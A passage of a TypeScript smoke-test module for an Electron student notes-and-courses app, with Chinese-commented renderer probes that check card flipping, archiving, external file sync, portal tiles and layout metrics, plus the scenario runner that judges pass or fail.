const SYNC_CHANGE_PROBE = `(async () => {
  ${PROBE_HELPERS}
  const shown = await waitForText('.cm-content', '外部追加的第一段', 12000)
  const refreshed = window.__syncEditorRef !== document.querySelector('.cm-editor')
  const title = document.querySelector('[data-role="title"]').value
  return JSON.stringify({ shown, refreshed, title, changeOk: shown && refreshed && title === '编辑器自检' })
})()`

/** 外部删掉那篇：列表要收起；顺便把编辑器置脏，好验下一步的冲突追问 */
const SYNC_UNLINK_PROBE = `(async () => {
  ${PROBE_HELPERS}
  const gone = await waitForGone('外部新增的笔记', 12000)
  const count = document.querySelectorAll('.sb-notes__item').length

  // 改标题不会触发自动保存（只有点「重命名」才落盘），所以这个「脏」
  // 会稳稳留到下一步，不会半路被自动保存清掉
  const input = document.querySelector('[data-role="title"]')
  input.value = '编辑器自检（改了还没保存）'
  input.dispatchEvent(new Event('input', { bubbles: true }))
  const dirty = document.querySelector('[data-role="status"]').textContent.includes('标题待保存')

  return JSON.stringify({ gone, count, dirty, unlinkOk: gone && count === 1 && dirty })
})()`

/** 有未保存内容时撞上外部改动：必须先问一句；选「保留我的内容」则编辑器不动 */
const SYNC_CONFLICT_KEEP_PROBE = `(async () => {
  ${PROBE_HELPERS}
  const confirm = await waitFor('.sb-modal [data-role="confirm"]', 12000)
  if (!confirm) return JSON.stringify({ error: '外部改动没有追问' })
  const asked = document.querySelector('.sb-modal__message').textContent.includes('还没有保存')
  document.querySelector('.sb-modal [data-role="cancel"]').click()
  await wait(700)

  const body = document.querySelector('.cm-content').textContent
  const status = document.querySelector('[data-role="status"]').textContent
  const kept = !body.includes('外部追加的第二段')
  return JSON.stringify({ asked, kept, status, keepOk: asked && kept })
})()`

/** 同样的冲突，这次选「载入磁盘版本」：编辑器要换成磁盘上的内容 */
const SYNC_CONFLICT_LOAD_PROBE = `(async () => {
  ${PROBE_HELPERS}
  const confirm = await waitFor('.sb-modal [data-role="confirm"]', 12000)
  if (!confirm) return JSON.stringify({ error: '第二次外部改动没有追问' })
  confirm.click()

  const shown = await waitForText('.cm-content', '外部追加的第三段', 12000)
  const title = document.querySelector('[data-role="title"]').value
  const status = document.querySelector('[data-role="status"]').textContent
  return JSON.stringify({ shown, title, status, loadOk: shown && title === '编辑器自检' })
})()`

/**
 * 外部改名。
 *
 * 这是整条链路上最容易出事的一种：如果对账把「改名」当成「删一篇 + 加一篇」，
 * 卡片与笔记的关联就会在用户改个文件名的时候无声地断掉。
 * 所以这里同时验三件事：列表里的标题跟着换、正在编辑的那篇没被弄丢、
 * 卡片仍然指着同一个 id。
 */
const SYNC_RENAME_PROBE = `(async () => {
  ${PROBE_HELPERS}
  const listed = await waitForText('[data-role="list"]', '改过名的笔记', 12000)
  const title = document.querySelector('[data-role="title"]').value
  const body = document.querySelector('.cm-content').textContent
  const oldGone = !document.querySelector('[data-role="list"]').textContent.includes('编辑器自检')
  const keptBody = body.includes('外部追加的第三段')
  return JSON.stringify({
    listed, title, keptBody, oldGone,
    renameOk: listed && title === '改过名的笔记' && keptBody && oldGone
  })
})()`

const CARDS_PROBE = `(async () => {
  ${PROBE_HELPERS}
  const nav = await waitFor('[data-route="study"]')
  if (!nav) return JSON.stringify({ error: '导航未就绪' })
  nav.click()
  await waitFor('[data-role="cards"]')

  // 先等课表数据到了再开——「从课表带过来」这个下拉是靠它填的。
  // 直接看下拉有没有选项，等于等语义状态而不是等元素（老坑了）
  const cardCount = await waitForCount('.sb-itemcard', 3)
  if (!cardCount) return JSON.stringify({ error: '卡片没渲染出来' })

  // —— 翻转：单击应该把卡片翻到背面，再点一次翻回来
  const first = document.querySelector('.sb-itemcard')
  const flipTarget = first.querySelector('[data-act="flip"]')
  flipTarget.click()
  await wait(420)
  const flipped = first.classList.contains('sb-itemcard--flipped')
  // 背面必须真的有内容，不能只是转了个空壳
  const backText = first.querySelector('.sb-itemcard__face--back').textContent.trim().length
  flipTarget.click()
  await wait(420)
  const flippedBack = !first.classList.contains('sb-itemcard--flipped')

  // 正面该显示的东西
  const frontFace = first.querySelector('.sb-itemcard__face--front')
  const frontText = frontFace.textContent
  const frontOk = frontText.includes('高等数学 A') && frontText.includes('张启明')

  // —— 排版体检：这些东西"看着挤不挤"没法自动判断，
  // 但"字号够不够大、内容溢没溢出、留白有多宽"是可以量的
  const nameEl = first.querySelector('.sb-course__name')
  const teacherEl = first.querySelector('.sb-course__teacher')
  const ratingsEl = first.querySelector('.sb-course__ratings')
  const faceRect = frontFace.getBoundingClientRect()
  const cardRect = first.getBoundingClientRect()
  const nameFont = nameEl ? parseFloat(getComputedStyle(nameEl).fontSize) : 0
  const teacherFont = teacherEl ? parseFloat(getComputedStyle(teacherEl).fontSize) : 0
  const bodyFont = ratingsEl
    ? parseFloat(getComputedStyle(first.querySelector('.sb-course__rating-label') || ratingsEl).fontSize)
    : 0
  // 正面内容不能溢出：写死高度之后，多出来的字会被切掉
  const faceOverflow = frontFace.scrollHeight > frontFace.clientHeight + 1
  // 名字块底边到分隔线之间还剩多少空白——太少显得挤，太多显得空
  const gapBeforeRule = ratingsEl
    ? Math.round(ratingsEl.getBoundingClientRect().top -
        (teacherEl ? teacherEl.getBoundingClientRect().bottom : faceRect.top))
    : 0
  const scoreBadge = first.querySelector('.sb-course__score')
  const scoreFont = scoreBadge ? parseFloat(getComputedStyle(scoreBadge).fontSize) : 0

  // 超长课程名的那张：名字必须被夹到两行且不能把内容顶出卡片。
  // 中文课名动辄十几个字，这是真实用户一定会碰到的情形，不是边角案例
  const longCard = document.querySelectorAll('.sb-itemcard')[2]
  const longFace = longCard.querySelector('.sb-itemcard__face--front')
  const longNameEl = longCard.querySelector('.sb-course__name')
  const longNameHeight = longNameEl.getBoundingClientRect().height
  const longLineHeight = parseFloat(getComputedStyle(longNameEl).lineHeight) || 23
  const longNameLines = Math.round(longNameHeight / longLineHeight)
  const longOverflow = longFace.scrollHeight > longFace.clientHeight + 1
  const longNameOk = longNameLines === 2 && !longOverflow

  // 强调色当文字用的时候，必须走 --color-accent-text 那一档：
  // 直接用主色在柔和底上对比度只有 3.9:1（浅色）/ 2.8:1（深色），读起来费劲
  const accentText = getComputedStyle(document.documentElement)
    .getPropertyValue('--color-accent-text')
    .trim()
  const badgeColor = scoreBadge ? getComputedStyle(scoreBadge).color : ''
  // 用 split/join 而不是正则：探针整段是模板字符串，
  // 正则里的 \s 会被当成转义吃掉，变成「去掉所有字母 s」这种鬼东西
  const contrastOk = badgeColor.split(' ').join('') === 'rgb(47,92,214)'
  // 名字块与分隔线之间的留白只设下限：课程名一行还是两行本来就差 23px，
  // 想把两边都卡进一个窄区间是不可能的。只要不挤就行
  const typoOk =
    nameFont >= 16 &&
    teacherFont >= 12.5 &&
    bodyFont >= 12 &&
    scoreFont >= 12.5 &&
    !faceOverflow &&
    cardRect.width >= 260 &&
    gapBeforeRule >= 10

  // —— 新建卡片：课程名与老师从课表带过来，不再手打一遍
  document.querySelector('[data-action="add"]').click()
  const picker = await waitFor('.sb-modal__card--form [data-field="picker"]')
  const nameInput = document.querySelector('.sb-modal__card--form [data-field="courseName"]')
  const teacherInput = document.querySelector('.sb-modal__card--form [data-field="teacher"]')
  const scoreInput = document.querySelector('.sb-modal__card--form [data-field="score"]')
  const saveBtn = document.querySelector('.sb-modal__card--form [data-role="save"]')
  if (!picker || !nameInput || !teacherInput || !saveBtn) {
    return JSON.stringify({ error: '卡片表单未挂载' })
  }
  const options = picker.querySelectorAll('option').length
  // 选项 = "手动填写" + 课表里去重后的课程数（种子里是 3 门）
  const pickerOk = options === 4
  picker.value = '2'
  picker.dispatchEvent(new Event('change', { bubbles: true }))
  const carriedName = nameInput.value
  const carriedTeacher = teacherInput.value
  if (scoreInput) scoreInput.value = 'A'
  saveBtn.click()

  const addedInTime = await waitForCount('.sb-itemcard', 4)
  const addedText = document.body.textContent.includes(carriedName)
  const carriedOk = carriedName.length > 0 && carriedTeacher.length > 0

  // —— 切到笔记页：卡片应该已经自动建好了同名笔记
  document.querySelector('[data-route="notes"]').click()
  await waitFor('[data-role="list"]')
  const expectedTitle = carriedTeacher ? carriedName + '_' + carriedTeacher : carriedName
  const listItems = await waitForCount('.sb-notes__item', 4)
  // 精确比对标题那一行，不能用整块的 includes——
  // 「A_老师」和「A_老师 (2)」互相包含，模糊匹配会挑错人
  const titles = Array.from(document.querySelectorAll('.sb-notes__item-title')).map((el) =>
    el.textContent.trim()
  )
  const autoNoteOk = titles.indexOf(expectedTitle) >= 0

  // 打开那篇自动建的笔记，写点东西并等自动保存落盘
  const target = Array.from(document.querySelectorAll('.sb-notes__item'))
    .find((el) => el.querySelector('.sb-notes__item-title').textContent.trim() === expectedTitle)
  let typedOk = false
  let editorMounted = false
  if (target) {
    target.click()
    // 编辑器是动态加载的，得等它挂上；标题被填上才说明内容真的读出来了
    editorMounted = Boolean(await waitFor('.cm-editor', 20000))
    const loaded = await waitForValue('[data-role="title"]', expectedTitle)
    if (editorMounted && loaded) {
      // 用工具栏插一张表：既证明编辑器能用，又给磁盘校验留了个好认的记号
      const tableButton = document.querySelector('.sb-editorbar [data-command="table"]')
      if (tableButton) {
        tableButton.click()
        typedOk = await waitForText('[data-role="status"]', '已保存', 8000)
      }
    }
  }

  // —— 从卡片点「记笔记」应该跳到笔记页并定位到那一篇。
  // 要挑**新建的那张**卡片（它在最后），否则点到的是别的课，测了个寂寞
  document.querySelector('[data-route="study"]').click()
  await waitForCount('.sb-itemcard', 4)
  const allCards = Array.from(document.querySelectorAll('.sb-itemcard'))
  const noteBtn = allCards[allCards.length - 1]
  if (noteBtn) noteBtn.querySelector('[data-act="note"]').click()
  await waitFor('[data-role="pane"]:not([hidden])')
  const jumpedTitle = document.querySelector('[data-role="title"]').value
  const jumpOk = jumpedTitle === expectedTitle

  // —— 三态：在学 / 想学、归档、已学库
  //
  // 这一路是四个真实的用户动作：改主意（挪进愿望单）、学完了（归档）、
  // 翻旧账（去已学库）、又想接着修（移回在学）。每一步都同时验「界面上数字变了」
  // 和「卡片真的换了地方」——只验按钮点得动等于没验。
  document.querySelector('[data-route="study"]').click()
  const backInTime = await waitForCount('.sb-itemcard', 4)
  if (!backInTime) return JSON.stringify({ error: '回到课程页后卡片没渲染出来' })

  const tabs = document.querySelectorAll('.sb-switch__item')
  const learningCount = document.querySelector('[data-count="learning"]')
  const wishCount = document.querySelector('[data-count="wish"]')
  const learningSelected = document
    .querySelector('[data-tab="learning"]')
    .getAttribute('aria-selected')
  const switchOk = Boolean(
    tabs.length === 2 &&
      learningSelected === 'true' &&
      learningCount &&
      learningCount.textContent.trim() === '4' &&
      wishCount &&
      wishCount.textContent.trim() === '0'
  )

  // 想学页签空着的时候，得说得出来自己是什么，而不是一个光秃秃的白框
  document.querySelector('[data-tab="wish"]').click()
  await wait(150)
  const wishTabEmpty = document.querySelectorAll('.sb-itemcard').length === 0
  const emptyEl = document.querySelector('.sb-cards > .sb-empty')
  const emptyHintOk = Boolean(emptyEl) && !emptyEl.hidden && emptyEl.textContent.includes('愿望单')

  document.querySelector('[data-tab="learning"]').click()
  const returnedToLearning = await waitForCount('.sb-itemcard', 4)

  // 把最后一张挪进愿望单：正面该换成「想修的理由 + 计划学期」，
  // 而不是照搬在学卡片、显示一排「未填」
  const lastCard = document.querySelectorAll('.sb-itemcard')[3]
  const wishButton = lastCard.querySelector('[data-act="status"][data-to="wish"]')
  if (wishButton) wishButton.click()
  const wishMoved = await waitForCount('.sb-itemcard', 3)
  document.querySelector('[data-tab="wish"]').click()
  const wishShown = await waitForCount('.sb-itemcard', 1)
  const wishFrontText = document.querySelector('.sb-itemcard__face--front').textContent
  const wishFrontOk = wishFrontText.includes('想修的理由') && wishFrontText.includes('计划')
  const wishCountNow = document.querySelector('[data-count="wish"]').textContent.trim()

  document.querySelector('[data-tab="learning"]').click()
  await waitForCount('.sb-itemcard', 3)

  // 归档一张：在学少一个，已学多一个
  const archiveButton = document.querySelector('.sb-itemcard [data-act="status"][data-to="learned"]')
  if (archiveButton) archiveButton.click()
  const archivedInTime = await waitForCount('.sb-itemcard', 2)
  const metaAfterArchive = document.querySelector('[data-role="meta"]').textContent
  const archiveOk = archivedInTime && metaAfterArchive.includes('已学 1')

  // 已学库：卡片该按学期分组摆着，而不是堆成一坨
  document.querySelector('[data-route="archived"]').click()
  const inArchive = await waitForCount('.sb-itemcard', 1)
  const groupTitle = document.querySelector('.sb-cards__group-title')
  const groupText = groupTitle ? groupTitle.textContent.trim() : ''
  // 归档会给没填学期的卡片补一个默认学期，所以这里不该出现「未填学期」。
  // 用 indexOf 而不是正则：探针整段是模板字符串，正则里的转义会被吃掉（老坑）
  const groupOk = Boolean(
    inArchive && groupText.length > 0 && groupText.indexOf('-') > 0 && groupText !== '未填学期'
  )

  // 移回在学：已学库要立刻空掉，并且说清楚为什么空
  const restoreButton = document.querySelector('.sb-itemcard [data-act="status"][data-to="learning"]')
  if (restoreButton) restoreButton.click()
  const archiveEmptied = await waitForCount('.sb-itemcard', 0)
  const archiveEmptyEl = document.querySelector('.sb-cards > .sb-empty')
  const restoreOk = Boolean(
    archiveEmptied && archiveEmptyEl && !archiveEmptyEl.hidden && archiveEmptyEl.textContent.includes('已学库')
  )

  // 再归档一次收尾：磁盘校验要求最后真有「已学」和「想学」两种状态落着
  document.querySelector('[data-route="study"]').click()
  await waitForCount('.sb-itemcard', 3)
  const archiveAgain = document.querySelector('.sb-itemcard [data-act="status"][data-to="learned"]')
  if (archiveAgain) archiveAgain.click()
  await waitForCount('.sb-itemcard', 2)
  document.querySelector('[data-route="archived"]').click()
  await waitForCount('.sb-itemcard', 1)

  return JSON.stringify({
    flipped, flippedBack, backText, frontOk, options, pickerOk,
    carriedName, carriedTeacher, carriedOk, addedInTime, addedText,
    listItems, autoNoteOk, typedOk, editorMounted, jumpedTitle, jumpOk,
    nameFont, teacherFont, bodyFont, scoreFont, gapBeforeRule, faceOverflow, typoOk,
    cardW: Math.round(cardRect.width), cardH: Math.round(cardRect.height),
    longNameLines, longOverflow, longNameOk, accentText, badgeColor, contrastOk,
    switchOk, wishTabEmpty, emptyHintOk, returnedToLearning, wishMoved, wishShown,
    wishFrontOk, wishCountNow, archivedInTime, archiveOk, inArchive, groupText, groupOk,
    archiveEmptied, restoreOk,
    flipOk: flipped && flippedBack && backText > 0,
    addOk: pickerOk && carriedOk && addedInTime && addedText,
    noteOk: listItems && autoNoteOk && typedOk,
    statusOk:
      switchOk && wishTabEmpty && emptyHintOk && returnedToLearning &&
      wishMoved && wishShown && wishFrontOk && wishCountNow === '1' && archiveOk,
    archivedOk: inArchive && groupOk && archiveEmptied && restoreOk
  })
})()`

const PORTAL_PROBE = `(async () => {
  ${PROBE_HELPERS}
  const nav = await waitFor('[data-route="portal"]')
  if (!nav) return JSON.stringify({ error: '导航未就绪' })
  nav.click()

  // 注意：只能等「站点都画出来了」，不能只等容器出现——
  // 容器是先建好、数据后到的，等容器等于什么都没等（课表探针踩过同样的坑）
  const renderedInTime = await waitForCount('.sb-portal__item', 3)
  if (!renderedInTime) return JSON.stringify({ error: '内置站点未渲染' })

  const builtins = document.querySelectorAll('.sb-portal__item').length
  const hasMooc = document.body.textContent.includes('中国大学 MOOC')
  const hasBilibili = document.body.textContent.includes('哔哩哔哩')

  // 图标走的是 sb-asset://icon/<file>，naturalWidth 只有真的加载成功才不为 0。
  // 这一步同时验证了图标目录在资源桶里、自定义协议注册成功、CSP 放行了这个协议。
  const icon = document.querySelector('.sb-portal__img')
  if (icon && !icon.complete) {
    await new Promise((resolve) => {
      icon.addEventListener('load', resolve, { once: true })
      icon.addEventListener('error', resolve, { once: true })
      setTimeout(resolve, 3000)
    })
  }
  const iconWidth = icon ? icon.naturalWidth : 0
  const letters = document.querySelectorAll('.sb-portal__letter').length

  // 光看 DOM 结构看不出布局塌掉：格子必须真的有尺寸，
  // 编辑态的操作条也必须真的占位（曾有过 flex 写错、整条被压成 0 高度的情况）
  const firstTile = document.querySelector('.sb-portal__item')
  const tileRect = firstTile ? firstTile.getBoundingClientRect() : { width: 0, height: 0 }
  const actions = firstTile ? firstTile.querySelector('.sb-portal__actions') : null
  const actionsHeight = actions ? actions.getBoundingClientRect().height : 0
  const layoutOk = tileRect.width >= 100 && tileRect.height >= 60 && actionsHeight > 0

  // —— 新增：走真实的表单链路（填表 → 保存 → 列表刷新）
  document.querySelector('[data-action="add"]').click()
  const nameInput = await waitFor('.sb-modal__card--form [data-field="name"]')
  const urlInput = document.querySelector('.sb-modal__card--form [data-field="url"]')
  const iconCheck = document.querySelector('.sb-modal__card--form [data-field="fetchIcon"]')
  const saveBtn = document.querySelector('.sb-modal__card--form [data-role="save"]')
  if (!nameInput || !urlInput || !saveBtn) return JSON.stringify({ error: '添加表单未挂载' })
  // 关掉「抓取图标」：自检环境可能没有网络，不能让这一步变成随机失败
  if (iconCheck) iconCheck.checked = false
  nameInput.value = '测试站点'
  urlInput.value = 'example.com'
  saveBtn.click()

  const addedInTime = await waitForCount('.sb-portal__item', 4)
  const addedText = document.body.textContent.includes('测试站点')
  const addedHost = document.body.textContent.includes('example.com')
  // 网址没带协议，应该被自动补成 https
  const lastTile = document.querySelectorAll('.sb-portal__item')[3]
  const addedHref = lastTile ? lastTile.querySelector('[data-act="open"]').getAttribute('title') : ''
  const urlOk = addedHref === 'https://example.com/'

  // —— 删除：新增的站点排在最后，点它的 ✕
  if (lastTile) lastTile.querySelector('[data-act="remove"]').click()
  const removedInTime = await waitForCount('.sb-portal__item', 3)
  const removedText = await waitForGone('测试站点')

  // —— 隐藏内置站点：内置的删不掉，只能隐藏，隐藏后要能从概览页看不出来。
  // 刻意挑第二个（B站）而不是第一个：第一个带着图标，留着它才能验证
  // 「首页的快捷启动也能把图标显示出来」
  const target = document.querySelectorAll('.sb-portal__item')[1]
  if (target) target.querySelector('[data-act="hide"]').click()
  await waitFor('.sb-portal__item--hidden')
  const hiddenCount = document.querySelectorAll('.sb-portal__item--hidden').length
  // 内置站点的删除按钮应该是禁用的
  const removeDisabled = target ? target.querySelector('[data-act="remove"]').disabled : false

  // —— 概览页复查：隐藏的那个不该出现在首页快捷启动里
  document.querySelector('[data-route="home"]').click()
  await waitFor('[data-role="portal-slot"]')
  const homeTiles = await waitForCount('[data-role="portal-slot"] .sb-portal__item', 2)
  const homeIcons = document.querySelectorAll('[data-role="portal-slot"] .sb-portal__img').length

  return JSON.stringify({
    builtins, hasMooc, hasBilibili, iconWidth, letters,
    addedInTime, addedText, addedHost, urlOk, addedHref,
    removedInTime, removedText, hiddenCount, removeDisabled, homeTiles, homeIcons,
    renderedInTime, tileW: Math.round(tileRect.width), tileH: Math.round(tileRect.height),
    actionsHeight: Math.round(actionsHeight),
    builtinsOk: builtins === 3 && hasMooc && hasBilibili,
    layoutOk,
    // 3 个内置站点里 1 个被塞了图标，其余 2 个回退到色块首字
    iconOk: iconWidth > 0 && letters === 2,
    addOk: addedInTime && addedText && addedHost && urlOk,
    deleteOk: removedInTime && removedText,
    hideOk: hiddenCount === 1 && removeDisabled,
    homeOk: homeTiles && homeIcons === 1
  })
})()`

/* ------------------------------------------------------------------ 主流程 */

export function runSmokeTestIfRequested(win: BrowserWindow): void {
  if (!smokeEnabled()) return

  const scenario = smokeScenario()

  // 导出场景要把四种产物写到一个**我们能去检查**的目录里。
  // 放 tempDir 下面而不是笔记库里面：笔记库里多出来的文件会参与对账，
  // 断言时容易把「导出的产物」和「笔记」混在一起看
  const exportDir =
    scenario === 'export'
      ? ensureDir(join(tempDir(context().settings.get().portableMode), 'export-check'))
      : ''

  const probe =
    scenario === 'timetable'
      ? TIMETABLE_PROBE
      : scenario === 'portal'
        ? PORTAL_PROBE
        : scenario === 'cards'
          ? CARDS_PROBE
          : scenario === 'notes'
            ? NOTES_PROBE
            : scenario === 'export'
              ? exportProbe(exportDir)
              : scenario === 'ai'
                ? aiProbe()
                : scenario === 'notion'
                  ? notionProbe()
              : scenario === 'security'
                ? SECURITY_PROBE
                : scenario === 'materials'
                  ? materialsProbe()
                  : BASIC_PROBE
  // sync 要在主进程与渲染层之间来回走好几趟；export 要跑一次 Packer
  // 再起一个隐藏窗口打印 PDF，都比纯界面自检慢得多
  const timeoutMs =
    scenario === 'basic'
      ? 20_000
      : scenario === 'sync'
        ? 70_000
        : scenario === 'export'
          ? 60_000
          : scenario === 'security'
            ? 60_000
            : scenario === 'materials'
              ? 45_000
              : 35_000

  const timer = setTimeout(() => {
    console.error(`[smoke] 超时：渲染层 ${timeoutMs / 1000} 秒内未完成自检`)
    app.exit(1)
  }, timeoutMs)

  // 把渲染层的报错原样转出来，否则自检失败时只能靠猜
  win.webContents.on('console-message', (...args: unknown[]) => {
    const first = args[0] as { level?: string; message?: string; lineNumber?: number; sourceId?: string }
    if (first && typeof first === 'object' && 'message' in first) {
      console.info(`[renderer:${first.level ?? '?'}] ${first.message} (${first.sourceId ?? ''}:${first.lineNumber ?? 0})`)
      return
    }
    const [, level, message, line, sourceId] = args as [unknown, number, string, number, string]
    console.info(`[renderer:${level}] ${message} (${sourceId}:${line})`)
  })

  win.webContents.on('render-process-gone', (_event, details) => {
    clearTimeout(timer)
    console.error('[smoke] 渲染进程崩溃：', details.reason, details.exitCode)
    app.exit(1)
  })

  win.webContents.once('did-fail-load', (_event, code, description) => {
    clearTimeout(timer)
    console.error(`[smoke] 加载失败：${code} ${description}`)
    app.exit(1)
  })

  win.webContents.once('did-finish-load', () => {
    // sync 场景要在「外部程序写盘」和「界面该有什么反应」之间来回切，
    // 一趟 executeJavaScript 装不下，所以单独走一条链路
    if (scenario === 'sync') {
      void runSyncScenario(win)
        .then((passed) => {
          clearTimeout(timer)
          setTimeout(() => app.exit(passed ? 0 : 1), 200)
        })
        .catch((error: unknown) => {
          clearTimeout(timer)
          console.error('[smoke] sync 场景执行失败：', error)
          app.exit(1)
        })
      return
    }

    void win.webContents
      .executeJavaScript(probe, true)
      .then(async (raw: unknown) => {
        clearTimeout(timer)
        const parsed = JSON.parse(String(raw)) as Record<string, unknown>
        console.info('[smoke] 渲染层自检：', raw)

        const passed =
          scenario === 'timetable'
            ? Boolean(
                parsed['navOk'] &&
                  parsed['hasCourse'] &&
                  parsed['cellsOk'] &&
                  parsed['filledOk'] &&
                  parsed['hasTime'] &&
                  parsed['editOk'] &&
                  parsed['filledAfterEditOk'] &&
                  parsed['imageOk'] &&
                  parsed['imageFitsOk']
              )
              : scenario === 'portal'
                ? Boolean(
                    parsed['builtinsOk'] &&
                      parsed['layoutOk'] &&
                      parsed['iconOk'] &&
                      parsed['addOk'] &&
                      parsed['deleteOk'] &&
                      parsed['hideOk'] &&
                      parsed['homeOk']
                  )
                  : scenario === 'notes'
                  ? Boolean(
                      parsed['editorOk'] &&
                        parsed['toolbarOk'] &&
                        parsed['convertCheck'] &&
                        parsed['tableOk'] &&
                        parsed['roundTrip']
                    )
                  : scenario === 'cards'
                  ? Boolean(
                      parsed['flipOk'] &&
                        parsed['frontOk'] &&
                        // 排版体检：字号够大、内容不溢出、留白不局促、长课名夹得住
                        parsed['typoOk'] &&
                        parsed['longNameOk'] &&
                        parsed['contrastOk'] &&
                        parsed['addOk'] &&
                        parsed['noteOk'] &&
                        parsed['jumpOk'] &&
                        // 三态：在学 / 想学切换、归档、已学库分组、移回在学
                        parsed['statusOk'] &&
                        parsed['archivedOk'] &&
                        // 界面说自己存了不算数，磁盘上真有一份对得上的文件才算
                        verifyNoteOnDisk() &&
                        verifyCardStatusOnDisk()
                    )
                  : scenario === 'export'
                  ? Boolean(
                      parsed['menuOk'] &&
                        // 同理：导出接口说成功了不算数，四种产物都得在磁盘上
                        // 对得上内容才算
                        verifyExportOutputs(parsed['results'])
                    )
                  : scenario === 'ai'
                  ? Boolean(
                      parsed['gateOk'] &&
                        parsed['providerOk'] &&
                        parsed['presetSwitchOk'] &&
                        parsed['keyFieldHiddenOk'] &&
                        parsed['localStateOk'] &&
                        parsed['noKeyBlocked'] &&
                        parsed['chipsOk'] &&
                        parsed['modalOk'] &&
                        parsed['openedWithoutKey'] &&
                        parsed['presetOk'] &&
                        parsed['modalClosed'] &&
                        // 「平台」那一行必须说人话：不能是 win32 / darwin 这种机器记号
                        parsed['aboutOk'] &&
                        // 没有系统钥匙串时（部分 Linux）不做落盘检查，
                        // 那条路要求的是「拒绝保存」而不是「写下明文」
                        (parsed['keyringUnavailable']
                          ? parsed['refusalOk']
                          : parsed['saveOk'] &&
                            parsed['clearOk'] &&
                            parsed['restored'] &&
                            verifySecretsOnDisk())
                    )
                  : scenario === 'notion'
                  ? Boolean(
                      parsed['hasSection'] &&
                        parsed['hasTarget'] &&
                        parsed['hasKind'] &&
                        parsed['hasToken'] &&
                        parsed['hasTest'] &&
                        parsed['hasPull'] &&
                        parsed['hasPushButton'] &&
                        // 缺配置必须拦在出网之前——这条是安全底线，
                        // 不能只是「界面上有个提示」
                        parsed['blockedBeforeNetwork'] &&
                        parsed['blockedNoNetwork'] &&
                        // 冲突判据与 id 解析：纯逻辑，磁盘/字符串层面验
                        verifyNotionIdParsing() &&
                        verifyConflictRules()
                    )
                  : scenario === 'security'
                  ? Boolean(
                      // 渲染层主探针：逃逸、暴露面、XSP 执行面、网络面、协议穿越、fuzz
                      parsed['escapeOk'] &&
                        parsed['preloadOk'] &&
                        parsed['xssBlocked'] &&
                        parsed['networkBlocked'] &&
                        parsed['assetEscapeOk'] &&
                        parsed['fuzzSurvived'] &&
                        parsed['fuzzMustReject'] &&
                        parsed['protoClean'] &&
                        parsed['renameRoundTripOk'] &&
                        parsed['windowOpenOk'] &&
                        // 第二轮：间接逃逸、CSP 各执行面、协议走私、
                        // 资料闸口、出网闸口、密钥接口、存储面、IPC 面
                        parsed['escapeIndirectOk'] &&
                        parsed['asset2Ok'] &&
                        parsed['asset2NormalStillWorks'] &&
                        parsed['materialGatesOk'] &&
                        parsed['outboundGatesSurvived'] &&
                        parsed['outboundGatesRejected'] &&
                        parsed['secretSurfaceOk'] &&
                        parsed['storageOk'] &&
                        parsed['ipcSurfaceOk'] &&
                        // 第二轮 CSP 绕过之后页面必须还没被拿下
                        parsed['cspBypassStillClean'] &&
                        // 协议走私里除了「合法 https」以外的都必须被拒
                        parsed['smuggleRejected']
                    )
                  : scenario === 'materials'
                  ? Boolean(
                      parsed['ok'] === true &&
                        // 界面说自己存了不算数，磁盘上真有一份对得上的文件才算
                        verifyMaterialsOnDisk()
                    )
                  : Boolean(
                      parsed['customElement'] &&
                        parsed['mounted'] &&
                        parsed['bridge'] &&
                        parsed['versionLabelOk']
                    )

        // 安全场景还有两笔账要在退出前结掉：
        //  - 导航劫持单独跑一趟（成功的话那一趟自己就死了，没法并进主探针）
        //  - 主进程到底有没有监听端口（渲染层自己看不出来）
        let finalPassed = passed
        if (scenario === 'security') {
          const hijackRaw = await win.webContents
            .executeJavaScript(SECURITY_HIJACK_PROBE, true)
            .catch(() => null)
          const hijack = hijackRaw
            ? (JSON.parse(String(hijackRaw)) as { hijacked?: boolean; after?: string })
            : // 探针没能跑完本身就说明页面被跳走了
              { hijacked: true }
          console.info('[smoke] 导航劫持探针：', JSON.stringify(hijack))
          if (hijack.hijacked) {
            console.error('[smoke] 渲染层把窗口导航到了外部地址：', hijack.after)
          }
          const noListeners = verifyNoListeningPorts()
          finalPassed = passed && !hijack.hijacked && noListeners
        }

        if (scenario === 'timetable') {
          // 自检结束时停在图片模式，先留一张图；再切回表格模式，留第二张
          await captureIfRequested(win, 'timetable-image.png')
          await win.webContents
            .executeJavaScript(
              `(async () => {
                 const wait = (ms) => new Promise((r) => setTimeout(r, ms))
                 const radio = document.querySelector('input[name="tt-mode"][value="table"]')
                 if (radio) { radio.checked = true; radio.dispatchEvent(new Event('change', { bubbles: true })) }
                 await wait(900)
                 return 'ok'
               })()`,
              true
            )
            .catch(() => undefined)
          await captureIfRequested(win, 'timetable-table.png')
        } else if (scenario === 'portal') {
          // 自检收尾停在概览页（正好能同时看到首页的门户格子）
          await captureIfRequested(win, 'portal-home.png')
        } else if (scenario === 'cards') {
          // 收尾先停在「课程与学习」页（留一张带卡片和状态切换器的截图），
          // 再去已学库留一张分组视图——三态是这个场景新加的东西，
          // 光看文字断言看不出分组到底排得对不对
          await win.webContents
            .executeJavaScript(
              `(async () => {
                 const wait = (ms) => new Promise((r) => setTimeout(r, ms))
                 document.querySelector('[data-route="study"]')?.click()
                 await wait(900)
                 return 'ok'
               })()`,
              true
            )
            .catch(() => undefined)
          await captureIfRequested(win, 'cards.png')

          await win.webContents
            .executeJavaScript(
              `(async () => {
                 const wait = (ms) => new Promise((r) => setTimeout(r, ms))
                 document.querySelector('[data-route="archived"]')?.click()
                 await wait(900)
                 return 'ok'
               })()`,
              true
            )
            .catch(() => undefined)
          await captureIfRequested(win, 'cards-archived.png')

          // 再回概览页：那里原来写着「课程卡片 —— 开发中」，现在是一句三态统计，
          // 截图留一份，省得以后再出现「功能做完了、首页还写着开发中」
          await win.webContents
            .executeJavaScript(
              `(async () => {
                 const wait = (ms) => new Promise((r) => setTimeout(r, ms))
                 document.querySelector('[data-route="home"]')?.click()
                 await wait(900)
                 return 'ok'
               })()`,
              true
            )
            .catch(() => undefined)
          await captureIfRequested(win, 'cards-home.png')
        } else if (scenario === 'notes') {
          // 收尾停在 Markdown 模式，留一张带编辑器与工具栏的截图
          await captureIfRequested(win, 'notes.png')
        } else if (scenario === 'export') {
          // 收尾时导出菜单是开着的，截图里能同时看到编辑器与菜单
          await captureIfRequested(win, 'export.png')
        } else if (scenario === 'ai') {
          // 收尾停在设置页的 AI 区块：滚过去再截，不然截图里只看得到上半页
          await win.webContents
            .executeJavaScript(
              `(async () => {
                 const wait = (ms) => new Promise((r) => setTimeout(r, ms))
                 document.querySelector('[data-route="settings"]')?.click()
